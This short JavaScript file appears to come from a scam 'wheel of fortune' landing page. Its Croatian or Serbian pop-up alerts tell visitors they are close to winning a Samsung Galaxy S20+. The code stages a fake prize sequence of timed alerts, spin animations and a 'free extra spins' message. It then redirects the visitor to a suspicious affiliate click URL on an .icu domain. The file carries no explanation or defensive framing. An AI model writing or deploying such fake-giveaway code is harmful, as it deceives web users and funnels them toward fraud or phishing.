

var afurl = 'https://pields-ladayeast.icu/click';


function linkTo(){
    window.location.href = afurl;
}


function spinnerAction() {
    var spinWin = document.getElementById("spin")

    var c = alert("************************************************\n\nDobrodošli na kolo sreće.  Zavrtite i dobijte sve informacije o novom Samsung Galaxy S20+! \n\n ************************************************");
    if (c == true) {

    } else {
        spinWin.className = spinWin.className + "spinAround";

        setTimeout(function() {
            alert("\n \n Osvojili ste 1 dodatna besplatna okreta!\n\n");
            spinWin.className = spinWin.className + " spinAround2";
        }, 6500);

        setTimeout(function() {
            spinWin.className = spinWin.className + " Op";
        }, 12600);

        setTimeout(function() {
            prize.style.display = "block";

        }, 13800);

        setTimeout(function() {
            var r = alert("************************************************\n\nHurrra!  Korak ste bliže novom Samsung Galaxy S20 + i možda ćete ga uskoro koristiti!  Kliknite OK! \n\n  \n\n************************************************\n\n");

            if (r == true) {} else { window.location = afurl }

        }, 16800);
    }

}
